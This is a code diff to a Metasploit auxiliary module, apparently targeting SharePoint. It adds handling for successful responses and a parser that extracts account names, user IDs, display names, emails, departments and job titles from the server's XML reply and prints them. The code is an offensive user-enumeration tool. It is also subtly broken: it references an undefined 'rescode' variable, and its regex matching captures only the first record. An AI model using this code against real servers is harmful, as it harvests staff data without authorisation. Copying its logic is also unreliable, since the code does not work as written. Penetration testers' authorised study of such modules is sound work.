@@ -77,12 +77,69 @@ class Metasploit3 < Msf::Auxiliary
 
     if (res.code.to_s == '404')
       print_error("Got HTTP Code <" + res.code.to_s + " Not Found>.  Check your URL and SharePoint Path. ")
+      #return
     end
     if (res.code.to_s == '401') or (res.code.to_s == '403')
       print_error("Got HTTP Code <" + res.code.to_s + ">  You're going to need credentials.")
+      #return
     end
 
-  end #end run_host
+    if (res.code.to_s == '200') # Success!
+      print_status("Got HTTP Code <" + rescode.to_s + ">  Request was successful!")
+      # Parse the result
+      parse_result(res.get_xml_document)
+    end
+
+  end
+
+  #
+  # Parse a successful response for user information
+  #
+  def parse_result(res)
+    account_names = []
+    user_ids = []
+    display_names = []
+    emails = []
+    departments = []
+    titles = []
+
+    # Parse for results
+    if (res =~ /<AccountName>([^<].*[^>])<\/AccountName>/)
+      account_names = res.match(/<AccountName>([^<].*[^>])<\/AccountName>/).to_a
+    end
+    if (res =~ /<UserInfoID>([^<].*[^>])<\/UserInfoID>/)
+      user_ids = res.match(/<UserInfoID>([^<].*[^>])<\/UserInfoID>/).to_a
+    end
+    if (res =~ /<DisplayName>([^<].*[^>])<\/DisplayName>/)
+      display_names = res.match(/<DisplayName>([^<].*[^>])<\/DisplayName>/).to_a
+    end
+    if (res =~ /<Email>([^<].*[^>])<\/Email>/)
+      emails = res.match(/<Email>([^<].*[^>])<\/Email>/).to_a
+    end
+    if (res =~ /<Department>([^<].*[^>])<\/Department>/)
+      departments = res.match(/<Department>([^<].*[^>])<\/Department>/).to_a
+    end
+    if (res =~ /<Title>([^<].*[^>])<\/Title>/)
+      titles = res.match(/<Title>([^<].*[^>])<\/Title>/).to_a
+    end
+
+    # Make sure we found anything before movign on...
+    if ( user_ids.length > 0 )
+      i = 1
+      while i < user_ids.length
+        print_status("***Finding " + i.to_s + " ***")
+        print_status("User ID: " + user_ids[i]) unless (not user_ids[i])
+        print_status("Account Name: " + account_names[i]) unless (not account_names[i])
+        print_status("Display Name: " + display_names[i]) unless (not display_names[i])
+        print_status("Email: " + emails[i]) unless (not emails[i])
+        print_status("Department: " + departments[i]) unless (not departments[i])
+        print_status("Title: " + titles[i]) unless (not titles[i])
+        i+=1
+      end
+    end
+
+  end
+
 
   #
   #  Create XML POST Payload
